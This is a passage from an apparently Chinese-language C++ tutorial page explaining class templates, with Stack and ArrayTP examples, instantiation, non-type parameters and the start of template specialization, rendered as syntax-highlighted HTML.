<span class="comment">// 类定义，可以使用模板参数 T1, T2 等作为类型</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T1 member1;</span><br><span class="line">    T2 member2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ClassName(<span class="keyword">const</span> T1 &amp; val1, <span class="keyword">const</span> T2 &amp; val2);</span><br><span class="line">    <span class="function">T1 <span class="title">getMember1</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 成员函数的定义也需要模板前缀</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2, ...&gt;</span><br><span class="line">ClassName&lt;T1, T2, ...&gt;::ClassName(<span class="keyword">const</span> T1 &amp; val1, <span class="keyword">const</span> T2 &amp; val2)</span><br><span class="line">    : member1(val1), member2(val2) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2, ...&gt;</span><br><span class="line">T1 ClassName&lt;T1, T2, ...&gt;::getMember1() <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> member1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;typename T&gt;</code> 或 <code>template &lt;class T&gt;</code>: 声明一个模板，<code>T</code> 是一个类型参数的占位符。<code>typename</code> 和 <code>class</code> 在这里是等价的。你可以使用任何有效的标识符作为类型参数名（通常用 <code>T</code>, <code>U</code>, <code>V</code> 等）。</li><li>  在类定义内部，可以使用模板参数 <code>T</code> 就像使用普通类型一样（例如，定义成员变量类型、函数参数类型、返回值类型）。</li><li>  <strong>成员函数定义:</strong> 当在类外部定义模板类的成员函数时，必须再次使用 <code>template &lt;...&gt;</code> 前缀，并且在类名后面跟上模板参数列表 <code>&lt;T1, T2, ...&gt;</code>。</li></ul><p><strong>示例：简单的 <code>Stack</code> 模板类</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stacktp.h -- 一个简单的栈模板类定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STACKTP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACKTP_H_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// 或者 template &lt;class T&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MAX = <span class="number">10</span> &#125;; <span class="comment">// 栈的最大容量 (非类型参数可以改进)</span></span><br><span class="line">    T items[MAX];      <span class="comment">// 存储栈元素的数组，类型为 T</span></span><br><span class="line">    <span class="keyword">int</span> top;           <span class="comment">// 栈顶索引</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Stack();</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isempty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isfull</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// push() returns false if stack already is full, true otherwise</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">push</span><span class="params">(<span class="keyword">const</span> T &amp; item)</span></span>; <span class="comment">// 参数类型为 T</span></span><br><span class="line">    <span class="comment">// pop() returns false if stack already is empty, true otherwise</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">pop</span><span class="params">(T &amp; item)</span></span>;        <span class="comment">// 参数类型为 T (通过引用返回弹出的元素)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 成员函数实现 (通常也放在头文件中)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">Stack&lt;T&gt;::Stack() : top(<span class="number">0</span>) &#123; <span class="comment">// 初始化栈顶</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;T&gt;::isempty() <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> top == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;T&gt;::isfull() <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> top == MAX;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;T&gt;::push(<span class="keyword">const</span> T &amp; item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (top &lt; MAX) &#123;</span><br><span class="line">        items[top++] = item; <span class="comment">// 使用类型 T 的赋值操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;T&gt;::pop(T &amp; item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (top &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        item = items[--top]; <span class="comment">// 使用类型 T 的赋值操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STACKTP_H_</span></span></span><br></pre></td></tr></table></figure><h3 id="14-4-2-使用模板类"><a href="#14-4-2-使用模板类" class="headerlink" title="14.4.2 使用模板类"></a>14.4.2 使用模板类</h3><p>要使用类模板，你需要<strong>实例化 (Instantiate)</strong> 它。实例化是指为模板参数提供具体的类型（或值），从而创建一个具体的类。</p><p><strong>语法:</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassName&lt;ConcreteType1, ConcreteType2, ...&gt; objectName(constructor_arguments);</span><br></pre></td></tr></table></figure><ul><li>  在类模板名称后面跟上尖括号 <code>&lt;&gt;</code>，并在其中指定用于替换模板参数的具体类型。</li><li>  然后像创建普通类的对象一样声明对象并调用构造函数。</li></ul><p><strong>示例：使用 <code>Stack</code> 模板</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stack_user.cpp -- 使用 Stack 模板类</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt; // for isalpha, etc. (假设用于处理输入)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stacktp.h&quot;</span> <span class="comment">// 包含模板定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实例化一个处理 int 的栈</span></span><br><span class="line">    Stack&lt;<span class="keyword">int</span>&gt; intStack; <span class="comment">// intStack 是一个 Stack&lt;int&gt; 类型的对象</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pushing integers onto intStack:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (!intStack.isfull() &amp;&amp; i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        intStack.push(i++);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i<span class="number">-1</span> &lt;&lt; <span class="string">&quot; pushed. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tempInt;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Popping integers from intStack:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (intStack.pop(tempInt)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; tempInt &lt;&lt; <span class="string">&quot; popped. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化一个处理 string 的栈</span></span><br><span class="line">    Stack&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; stringStack; <span class="comment">// stringStack 是一个 Stack&lt;std::string&gt; 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> items[] = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pushing strings onto stringStack:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; s : items) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stringStack.push(s)) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;\&quot; pushed. &quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stack full, cannot push \&quot;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;\&quot;.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> tempString;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Popping strings from stringStack:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (stringStack.pop(tempString)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; tempString &lt;&lt; <span class="string">&quot;\&quot; popped. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong></p><p>由于模板的实现通常放在头文件中，你只需要编译使用模板的源文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ stack_user.cpp -o stack_user</span><br><span class="line">./stack_user</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Pushing integers onto intStack:</span><br><span class="line">0 pushed. 1 pushed. 2 pushed. 3 pushed. 4 pushed.</span><br><span class="line">Popping integers from intStack:</span><br><span class="line">4 popped. 3 popped. 2 popped. 1 popped. 0 popped.</span><br><span class="line">Pushing strings onto stringStack:</span><br><span class="line">&quot;apple&quot; pushed. &quot;banana&quot; pushed. &quot;cherry&quot; pushed.</span><br><span class="line">Popping strings from stringStack:</span><br><span class="line">&quot;cherry&quot; popped. &quot;banana&quot; popped. &quot;apple&quot; popped.</span><br></pre></td></tr></table></figure><h3 id="14-4-3-深入探讨模板类"><a href="#14-4-3-深入探讨模板类" class="headerlink" title="14.4.3 深入探讨模板类"></a>14.4.3 深入探讨模板类</h3><ul><li><p>  <strong>模板编译模型:</strong> 类模板本身并不会被编译成代码。只有当你用具体类型<strong>实例化</strong>模板时，编译器才会根据提供的类型生成对应的具体类（例如 <code>Stack&lt;int&gt;</code> 类和 <code>Stack&lt;string&gt;</code> 类）的代码。这个过程称为**模板实例化 (Template Instantiation)**。</p></li><li><p>  <strong>实现放在头文件:</strong> 由于编译器在实例化模板时需要看到模板的完整定义（包括成员函数的实现），所以类模板的成员函数实现<strong>通常也放在头文件中</strong> (<code>.h</code> 或 <code>.hpp</code>)，而不是单独的 <code>.cpp</code> 文件中。如果放在 <code>.cpp</code> 文件中，链接器在链接其他使用该模板的 <code>.cpp</code> 文件时，可能找不到所需实例化的代码。</p></li><li><p>  <strong>隐式实例化 (Implicit Instantiation):</strong> 当你声明一个特定类型的模板类对象时（如 <code>Stack&lt;int&gt; s;</code>），编译器会自动进行隐式实例化。</p></li><li><p><strong>显式实例化 (Explicit Instantiation):</strong> 你可以显式地指示编译器创建一个特定类型的实例，即使代码中没有直接使用该类型的对象。这在某些库设计或构建过程中可能有用。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> <span class="class"><span class="keyword">class</span> <span class="title">Stack</span>&lt;</span><span class="keyword">double</span>&gt;; <span class="comment">// 在某个 .cpp 文件中显式实例化 Stack&lt;double&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>  <strong>类型要求:</strong> 模板代码对用作模板参数的类型通常有一些隐式要求。例如，<code>Stack</code> 模板要求类型 <code>T</code> 具有可用的赋值运算符 (<code>operator=</code>)，因为 <code>push</code> 和 <code>pop</code> 方法中使用了赋值。如果尝试用不满足这些要求的类型（如没有赋值运算符的类）实例化模板，编译器会报错。</p></li></ul><h3 id="14-4-4-数组模板示例和非类型参数"><a href="#14-4-4-数组模板示例和非类型参数" class="headerlink" title="14.4.4 数组模板示例和非类型参数"></a>14.4.4 数组模板示例和非类型参数</h3><p>类模板不仅可以有<strong>类型参数</strong> (<code>typename T</code> 或 <code>class T</code>)，还可以有**非类型参数 (Non-type Parameters)**。非类型参数是具有固定类型的值，通常是整型（<code>int</code>, <code>size_t</code> 等）、指针、引用或枚举。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> N&gt; <span class="comment">// T 是类型参数，N 是非类型参数 (int 类型)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayTP</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T ar[N]; <span class="comment">// 数组大小由模板参数 N 决定</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    T &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  非类型参数 <code>N</code> 成为模板定义的一部分。</li><li>  在实例化时，必须为非类型参数提供一个<strong>常量表达式</strong>。</li></ul><p><strong>示例：固定大小的数组模板 <code>ArrayTP</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arraytp.h -- 模板类 ArrayTP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ARRAYTP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARRAYTP_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for exit()</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> n&gt; <span class="comment">// n 是非类型参数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayTP</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T ar[n]; <span class="comment">// 数组大小为 n</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ArrayTP() &#123;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">ArrayTP</span><span class="params">(<span class="keyword">const</span> T &amp; v)</span></span>;</span><br><span class="line">    <span class="keyword">virtual</span> T &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);</span><br><span class="line">    <span class="keyword">virtual</span> T <span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> n&gt;</span><br><span class="line">ArrayTP&lt;T, n&gt;::ArrayTP(<span class="keyword">const</span> T &amp; v) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        ar[i] = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> n&gt;</span><br><span class="line">T &amp; ArrayTP&lt;T, n&gt;::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error in array limits: &quot;</span> &lt;&lt; i</span><br><span class="line">                  &lt;&lt; <span class="string">&quot; is out of range\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ar[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> n&gt;</span><br><span class="line">T ArrayTP&lt;T, n&gt;::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error in array limits: &quot;</span> &lt;&lt; i</span><br><span class="line">                  &lt;&lt; <span class="string">&quot; is out of range\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ar[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// ARRAYTP_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 ArrayTP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;arraytp.h&quot;</span> <span class="comment">// 包含模板定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实例化一个包含 10 个 int 的数组</span></span><br><span class="line">    ArrayTP&lt;<span class="keyword">int</span>, <span class="number">10</span>&gt; sums;</span><br><span class="line">    <span class="comment">// 实例化一个包含 10 个 double 的数组</span></span><br><span class="line">    ArrayTP&lt;<span class="keyword">double</span>, <span class="number">10</span>&gt; aves;</span><br><span class="line">    <span class="comment">// 实例化一个包含 5 个指向 double 的指针的数组</span></span><br><span class="line">    ArrayTP&lt; ArrayTP&lt;<span class="keyword">int</span>, <span class="number">5</span>&gt;, <span class="number">10</span> &gt; twodee; <span class="comment">// 模板嵌套：10x5 的 int 数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        sums[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">            twodee[i][j] = (i + <span class="number">1</span>) * (j + <span class="number">1</span>);</span><br><span class="line">            sums[i] += twodee[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        aves[i] = (<span class="keyword">double</span>) sums[i] / <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.width(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.width(<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sums[i] &lt;&lt; <span class="string">&quot; = average &quot;</span> &lt;&lt; aves[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ArrayTP&lt;double, 0&gt; zero_size; // 错误或无意义，取决于编译器和实现</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>ArrayTP&lt;int, 10&gt;</code> 和 <code>ArrayTP&lt;double, 10&gt;</code> 是<strong>不同</strong>的类型。</li><li>  <code>ArrayTP&lt;int, 10&gt;</code> 和 <code>ArrayTP&lt;int, 12&gt;</code> 也是<strong>不同</strong>的类型。</li><li>  非类型参数允许我们在编译时确定数组大小等属性，这比动态分配更高效，并且可以进行更严格的类型检查。<code>std::array</code> 就是使用非类型参数来指定大小的。</li></ul><h3 id="14-4-5-模板多功能性"><a href="#14-4-5-模板多功能性" class="headerlink" title="14.4.5 模板多功能性"></a>14.4.5 模板多功能性</h3><p>类模板可以与 C++ 的其他特性结合使用，提供强大的功能：</p><ul><li>  <strong>递归使用:</strong> 模板可以递归地使用自身，如 <code>ArrayTP&lt; ArrayTP&lt;int, 5&gt;, 10 &gt;</code> 创建二维数组。</li><li>  <strong>指针类型参数:</strong> 可以用指针类型实例化模板，例如 <code>Stack&lt;int*&gt;</code> 创建一个存储 <code>int</code> 指针的栈。</li><li>  <strong>包含模板成员:</strong> 类模板可以包含其他模板类的对象作为成员。</li><li>  <strong>继承:</strong> 类模板可以参与继承，可以从模板类派生，也可以从普通类派生，或者模板类本身从其他类派生。</li></ul><h3 id="14-4-6-模板的具体化"><a href="#14-4-6-模板的具体化" class="headerlink" title="14.4.6 模板的具体化"></a>14.4.6 模板的具体化</h3><p>有时，通用的模板定义对于某些特定类型可能不是最优的，或者根本无法工作。这时，我们需要为特定类型提供一个专门化的模板定义，这称为**模板具体化 (Template Specialization)**。</p><ol><li><p><strong>显式具体化 (Explicit Specialization):</strong> 为某个特定的类型（或一组特定类型）提供一个完全不同的类定义。</p><p> <strong>语法:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;&gt; <span class="comment">// 空的模板参数列表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span>&lt;</span>SpecificType&gt; &#123;</span><br><span class="line">    <span class="comment">// 针对 SpecificType 的特殊实现</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> <strong>示例:</strong> 假设我们想为 <code>Stack&lt;const char*&gt;</code> 提供一个特殊版本，它能正确处理 C 风格字符串的复制。</p> <figure class="highlight cpp"><table><tr><td 